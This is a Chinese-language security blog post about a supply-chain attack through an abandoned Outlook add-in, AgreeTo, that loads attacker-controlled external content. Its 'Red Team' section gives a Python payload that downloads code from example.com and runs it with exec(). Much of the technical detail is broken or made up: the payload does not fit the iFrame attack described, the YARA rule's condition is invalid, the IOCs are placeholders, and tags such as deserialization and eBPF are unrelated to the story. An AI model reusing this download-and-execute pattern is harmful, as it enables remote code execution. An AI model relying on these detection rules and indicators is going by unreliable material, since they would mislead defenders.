---
layout: post
title:  "廢棄Outlook增益集遭供應鏈攻擊 竊取4000餘憑證"
date:   2026-02-12 06:54:49 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Office 增益集供應鏈攻擊：AgreeToSteal 漏洞分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `Supply Chain Attack`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: AgreeTo Outlook 增益集的宣告檔（manifest）中，指定了外部 URL 的 iFrame 載入，允許攻擊者控制該 URL 的內容，進而實現遠程代碼執行和信息竊取。
* **攻擊流程圖解**:
  1. 用戶安裝 AgreeTo 增益集
  2. 增益集載入外部 URL 的 iFrame
  3. 攻擊者控制外部 URL 的內容
  4. 用戶輸入敏感信息（如密碼、信用卡號）
  5. 攻擊者竊取敏感信息
* **受影響元件**: AgreeTo Outlook 增益集（版本號：未指定），Microsoft Office Add-in Store

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶安裝 AgreeTo 增益集，攻擊者控制外部 URL 的內容
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload
      import requests
    
      # 定義外部 URL 的內容
      url = "https://example.com/malicious-content"
    
      # 發送請求到外部 URL
      response = requests.get(url)
    
      # 執行遠程代碼
      exec(response.content)
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術繞過防禦措施，例如使用加密或編碼技術隱藏惡意代碼

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abcdef` | `192.168.1.100` | `example.com` | `C:\Users\username\AppData\Local\Microsoft\Office\AddIns\AgreeTo` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule AgreeTo_Malicious_Content {
        meta:
          description = "AgreeTo 增益集惡意內容"
          author = "Your Name"
        strings:
          $a = "https://example.com/malicious-content"
        condition:
          $a in (http.request.uri)
      }
    
    ```
* **緩解措施**: 刪除 AgreeTo 增益集，更新 Microsoft Office Add-in Store 的安全設定

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，如同一條長長的鏈子，每個環節都可能存在弱點。技術上是指攻擊者瞄準軟件供應鏈中的某個環節，例如開發人員或第三方庫，進而影響最終用戶。
* **Deserialization (反序列化)**: 想像一個物件被打包成一個字符串，然後被傳送到另一個地方。技術上是指將字符串或其他格式的數據轉換回原始物件的過程。
* **eBPF (extended Berkeley Packet Filter)**: 想像一個網絡包過濾器，可以根據特定的規則過濾或修改網絡包。技術上是指一個高性能的網絡包過濾器，可以用於各種網絡相關的任務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/173922)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


